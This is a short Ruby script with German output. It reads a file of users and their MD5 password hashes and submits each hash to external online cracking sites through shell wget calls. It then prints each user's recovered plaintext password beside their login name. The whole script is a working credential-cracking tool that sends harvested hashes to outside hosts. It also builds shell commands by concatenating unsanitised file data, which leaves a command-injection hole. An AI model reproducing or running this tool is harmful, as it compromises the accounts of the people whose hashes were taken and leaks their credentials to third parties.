IO.foreach("users.txt") { |line|
  parts = line.split(';')
  sed= '| grep Found | sed \'s/.*"\(.*\)".*/\1/\''
  sed2 = '| grep Pass | sed -e \'s/<[^>]*>//g\' | sed -e \'s/Hash//g\' | sed -e \'s/Pass//g\' | sed -e \'s/'+parts[3].to_s+'//g\''
  command = "wget --quiet --post-data=\"term="+parts[3].to_s+"&crackbtn=Crack\ that\ hash\ baby\!\" http://www.md5crack.com/crackmd5.php -O - "+sed
  IO.popen(command, "r") do |pipe|
    result = pipe.read
    unless result.empty?
      puts "Das Passwort fuer #{parts[2].to_s} (login '#{parts[1].to_s}') ist: "+ result
    else
      command2 = "wget --quiet --post-data=\"hash="+parts[3].to_s+"&code=63a34aeb5ad06f69ab08f824c692ba77\" http://gdataonline.com/seekhash.php -O - "+sed2
      IO.popen(command2, "r") do |pipe2|
        result = pipe2.read
        puts "Das Passwort fuer #{parts[2].to_s} (login '#{parts[1].to_s}') ist: "+ result
      end
    end
  end
}

